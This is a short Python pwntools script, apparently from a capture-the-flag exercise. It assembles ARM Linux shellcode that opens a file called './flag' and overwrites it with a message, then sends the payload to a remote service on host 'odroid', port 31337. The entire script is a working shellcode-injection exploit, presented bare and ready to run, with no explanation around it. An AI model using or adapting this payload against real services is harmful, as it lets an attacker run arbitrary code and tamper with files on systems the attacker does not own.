#!python

from pwn import *
context('arm', 'linux', 'ipv4')

msg = 'hello world~~~'

sc =  asm(shellcode.open_file('./flag', 0x2))
sc += asm(shellcode.write_file(in_fd=3, contents=msg, size=len(msg)))

s = remote('odroid', 31337)
s.send(sc + '\n')
